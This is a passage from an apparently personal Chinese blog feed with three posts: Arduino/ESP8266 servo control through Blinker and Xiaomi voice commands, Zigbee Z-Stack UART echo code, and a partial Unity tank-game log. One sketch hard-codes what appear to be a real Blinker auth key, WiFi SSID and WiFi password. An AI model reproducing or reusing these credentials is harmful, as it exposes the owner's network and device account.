punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> BLINKER_CMD_OFF<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//  digitalWrite(LED_BUILTIN, LOW);</span>        servo_16<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         servo_16<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span><span class="token string">"off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">miotQuery</span><span class="token punctuation">(</span>int32_t queryCode<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"MIOT Query codes: "</span><span class="token punctuation">,</span> queryCode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>queryCode<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> BLINKER_CMD_QUERY_ALL_NUMBER <span class="token operator">:</span>            <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"MIOT Query All"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span>oState <span class="token operator">?</span> <span class="token string">"on"</span> <span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> BLINKER_CMD_QUERY_POWERSTATE_NUMBER <span class="token operator">:</span>            <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"MIOT Query Power State"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span>oState <span class="token operator">?</span> <span class="token string">"on"</span> <span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span> <span class="token operator">:</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span>oState <span class="token operator">?</span> <span class="token string">"on"</span> <span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dataRead</span><span class="token punctuation">(</span><span class="token keyword">const</span> String <span class="token operator">&amp;</span> data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"Blinker readString: "</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    Blinker<span class="token punctuation">.</span><span class="token function">vibrate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint32_t BlinkerTime <span class="token operator">=</span> <span class="token function">millis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Blinker<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>BlinkerTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    Blinker<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"millis"</span><span class="token punctuation">,</span> BlinkerTime<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Serial<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token number">115200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    BLINKER_DEBUG<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>Serial<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 初始化有LED的IO</span>    <span class="token comment">//这里初始话后没有调用板子自带的led</span>    <span class="token function">pinMode</span><span class="token punctuation">(</span>LED_BUILTIN<span class="token punctuation">,</span> OUTPUT<span class="token punctuation">)</span><span class="token punctuation">;</span>    servo_16<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">digitalWrite</span><span class="token punctuation">(</span>LED_BUILTIN<span class="token punctuation">,</span> HIGH<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 初始化blinker</span>    Blinker<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span>auth<span class="token punctuation">,</span> ssid<span class="token punctuation">,</span> pswd<span class="token punctuation">)</span><span class="token punctuation">;</span>    BlinkerMIOT<span class="token punctuation">.</span><span class="token function">attachQuery</span><span class="token punctuation">(</span>miotQuery<span class="token punctuation">)</span><span class="token punctuation">;</span>    Blinker<span class="token punctuation">.</span><span class="token function">attachData</span><span class="token punctuation">(</span>dataRead<span class="token punctuation">)</span><span class="token punctuation">;</span>    BlinkerMIOT<span class="token punctuation">.</span><span class="token function">attachPowerState</span><span class="token punctuation">(</span>miotPowerState<span class="token punctuation">)</span><span class="token punctuation">;</span>    Button1<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>button1_callback<span class="token punctuation">)</span><span class="token punctuation">;</span>    Button2<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>button2_callback<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Blinker<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用米家、小爱同学的代码"><a href="#使用米家、小爱同学的代码" class="headerlink" title="使用米家、小爱同学的代码"></a>使用米家、小爱同学的代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">BLINKER_WIFI</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">BLINKER_MIOT_OUTLET</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Servo.h></span></span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">PIN_SERVO D0 </span><span class="token comment">//舵机信号线</span></span> Servo myservo<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Blinker.h></span></span> <span class="token keyword">char</span> auth<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"25835afb24a1"</span><span class="token punctuation">;</span><span class="token keyword">char</span> ssid<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"江枫渔火对愁眠"</span><span class="token punctuation">;</span><span class="token keyword">char</span> pswd<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"20011204"</span><span class="token punctuation">;</span> bool oState <span class="token operator">=</span> false<span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">miotPowerState</span><span class="token punctuation">(</span><span class="token keyword">const</span> String <span class="token operator">&amp;</span> state<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"need set power state: "</span><span class="token punctuation">,</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>    myservo<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>PIN_SERVO<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> BLINKER_CMD_ON<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        myservo<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//舵机正转度数</span>        <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         oState <span class="token operator">=</span> true<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> BLINKER_CMD_OFF<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        myservo<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//舵机反转度数</span>        <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span><span class="token string">"off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           oState <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">miotQuery</span><span class="token punctuation">(</span>int32_t queryCode<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"MIOT Query codes: "</span><span class="token punctuation">,</span> queryCode<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">switch</span> <span class="token punctuation">(</span>queryCode<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> BLINKER_CMD_QUERY_ALL_NUMBER <span class="token operator">:</span>            <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"MIOT Query All"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span>oState <span class="token operator">?</span> <span class="token string">"on"</span> <span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> BLINKER_CMD_QUERY_POWERSTATE_NUMBER <span class="token operator">:</span>            <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"MIOT Query Power State"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span>oState <span class="token operator">?</span> <span class="token string">"on"</span> <span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span> <span class="token operator">:</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">powerState</span><span class="token punctuation">(</span>oState <span class="token operator">?</span> <span class="token string">"on"</span> <span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BlinkerMIOT<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">dataRead</span><span class="token punctuation">(</span><span class="token keyword">const</span> String <span class="token operator">&amp;</span> data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">BLINKER_LOG</span><span class="token punctuation">(</span><span class="token string">"Blinker readString: "</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>     Blinker<span class="token punctuation">.</span><span class="token function">vibrate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        uint32_t BlinkerTime <span class="token operator">=</span> <span class="token function">millis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Blinker<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"millis"</span><span class="token punctuation">,</span> BlinkerTime<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Serial<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token number">115200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    BLINKER_DEBUG<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>Serial<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">pinMode</span><span class="token punctuation">(</span>LED_BUILTIN<span class="token punctuation">,</span> OUTPUT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">digitalWrite</span><span class="token punctuation">(</span>LED_BUILTIN<span class="token punctuation">,</span> LOW<span class="token punctuation">)</span><span class="token punctuation">;</span>     Blinker<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span>auth<span class="token punctuation">,</span> ssid<span class="token punctuation">,</span> pswd<span class="token punctuation">)</span><span class="token punctuation">;</span>    Blinker<span class="token punctuation">.</span><span class="token function">attachData</span><span class="token punctuation">(</span>dataRead<span class="token punctuation">)</span><span class="token punctuation">;</span>        BlinkerMIOT<span class="token punctuation">.</span><span class="token function">attachPowerState</span><span class="token punctuation">(</span>miotPowerState<span class="token punctuation">)</span><span class="token punctuation">;</span>    BlinkerMIOT<span class="token punctuation">.</span><span class="token function">attachQuery</span><span class="token punctuation">(</span>miotQuery<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Blinker<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续~"></a>未完待续~</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于zigbee协议栈串口发送与接收</title>
      <link href="2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/"/>
      <url>2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="问题伊始"><a href="#问题伊始" class="headerlink" title="问题伊始"></a>问题伊始</h2><p>这个问题出现在了智能健康生活的智能小灯的项目之中，开始的东西并没有使用到这个zigbee的协议栈，安装这个zigbee的协议栈之后，这个项目变得非常强大，网上说这个z-stack算是一个操作系统了，emmm，不知道真的假的，毕竟我的操作系统学的不怎么样，下面正式进入问题。</p><h2 id="自己的代码加在哪里"><a href="#自己的代码加在哪里" class="headerlink" title="自己的代码加在哪里"></a>自己的代码加在哪里</h2><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211013234622320.png" alt></p><p>这是我自己加的代码，文件和函数都可以看的很清楚哈，然后你一运行发现会报错，这是为什么呢，简单看一下报错信息就知道了，原来是我们没有include h库，直接在上面添加</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//测试用include</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"MT_UART.h"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>即可。</p><p>然后将mt的默认波特率改了，改成我们实验常用的19200即可，下面划住的部分最后的38400改为19200即可。</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211013234908994.png" alt></p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211013234828411.png" alt></p><h2 id="串口发送"><a href="#串口发送" class="headerlink" title="串口发送"></a>串口发送</h2><p>代码如下，添加的内容上一部分已经说过</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//添加测试一个字符串发送功能</span><span class="token function">MT_UartInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//串口初始化</span><span class="token function">MT_UartRegisterTaskID</span><span class="token punctuation">(</span>task_id<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//注册串口任务</span><span class="token function">HalUARTWrite</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"What happened!\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token string">"What happened!\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//字符串发送</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：要关闭串口通信里面的流控，即下面图片中的内容</strong></p><p>true -&gt; false即可</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211014001540970.png" alt></p><p>运行到底就会发现我们的串口调试器已经收到了来自我们的终端开发板的信息了</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211013235151552.png" alt></p><p><em>在这里还有一些其他的配置，但是都跟我们的实验没有关系，这里我就不再多记录了</em></p><h2 id="串口接收"><a href="#串口接收" class="headerlink" title="串口接收"></a>串口接收</h2><p>在这里，我们需要自己写一个串口接收的回调函数代替MT_UartProcessZToolData()函数，函数的具体内容如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//自定义串口接收函数如下:</span><span class="token keyword">void</span> <span class="token function">rxCB</span><span class="token punctuation">(</span>uint8 port<span class="token punctuation">,</span> uint8 event<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> len<span class="token punctuation">;</span>    len <span class="token operator">=</span> <span class="token function">HalUARTRead</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读取串口数据，返回数据长度</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">HalUARTWrite</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过串口原样返回数据也可以修改数据返回用于区分数据</span>    len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211014003554954.png" alt></p><p>将上面的内容替换为我图中已经替换成的内容，即修改uart的callback函数为我们的自定义串口接收函数。</p><p>现在即可实现电脑向终端发送字符串，终端对字符串进行原样返回的功能了。</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>但是在这里我遇到了一个小问题，如下图</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211014005533366.png" alt></p><p>谷歌一下，发现注释掉debug的字符串即可（具体操作见下图）。</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211014005721000.png" alt></p><p>下面就恢复了，so easy</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/image-20211014005835171.png" alt></p><h2 id="实现计算机-gt-终端-gt-协调器命令控制"><a href="#实现计算机-gt-终端-gt-协调器命令控制" class="headerlink" title="实现计算机-&gt;终端-&gt;协调器命令控制"></a>实现计算机-&gt;终端-&gt;协调器命令控制</h2><p>这个在前面的基础上就很简单了，~~ 明天再写 ~~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Unity坦克大战开发文档</title>
      <link href="2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/"/>
      <url>2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想做Unity开发的一个尝试，今天开始来试一试。因为是从中间开始写的博客，所以这里前面的内容就不再写了。</p><blockquote><p>参考<a href="https://www.bilibili.com/video/BV1PW41197Su">bilibili</a>，这篇文章里面的讲解很详细，到时候有需要的话，或者哪里忘记了可以再回来重温一下。</p><p>下面是资料与素材的<a href="http://www.sikiedu.com/my/course/90/material">链接</a></p></blockquote><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211005224459006.png" alt></p><h2 id="资源导入"><a href="#资源导入" class="headerlink" title="资源导入"></a>资源导入</h2><p>先将unitypackage文件导入进asset文件夹里面，直接import选择就行。</p><pre class="line-numbers language-none"><code class="language-none">图片切割动画制作player脚本制作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="碰撞检测"><a href="#碰撞检测" class="headerlink" title="碰撞检测"></a>碰撞检测</h2><p>2D的碰撞器为，创建脚本的那里选择Box collider 2D。</p><p>对预制体(prefabs)进行操作的时候，老师讲的是有个apply的一个操作的，<del>但是注意到unity 2020中并没有这个apply的操作</del>(我后来找到了，在这里，如下图)，似乎是直接改变预制体的属性，Hierarchy中的属性就会也跟着更改。</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211006123654506.png" alt></p><p>令，对移动的物体创建刚体(Rigidbody 2D)的属性，这里我们只对坦克创建刚体的属性，其他map相关的地方，除了草丛不用创建碰撞器，其他的都需要创建碰撞器。</p><h2 id="遇到的问题及其解决方案"><a href="#遇到的问题及其解决方案" class="headerlink" title="遇到的问题及其解决方案"></a>遇到的问题及其解决方案</h2><h3 id="坦克旋转问题解决"><a href="#坦克旋转问题解决" class="headerlink" title="坦克旋转问题解决"></a>坦克旋转问题解决</h3><p>把z轴锁上</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211005235455220.png" alt></p><h3 id="解决抖动的问题"><a href="#解决抖动的问题" class="headerlink" title="解决抖动的问题"></a>解决抖动的问题</h3><p>这个问题是刚体与障碍物碰撞产生的，这里使用固定物理帧的方法，就是把update方法换为FixedUpdate方法，为private函数。</p><p>并且把<code>Time.deltaTime</code>改为<code>Time.fixedDeltaTime</code></p><h3 id="解决移动优先级的问题"><a href="#解决移动优先级的问题" class="headerlink" title="解决移动优先级的问题"></a>解决移动优先级的问题</h3><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">&#x2F;**解决移动优先级问题*&#x2F;if (x !&#x3D; 0)&#123;    return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="渲染优先级的问题"><a href="#渲染优先级的问题" class="headerlink" 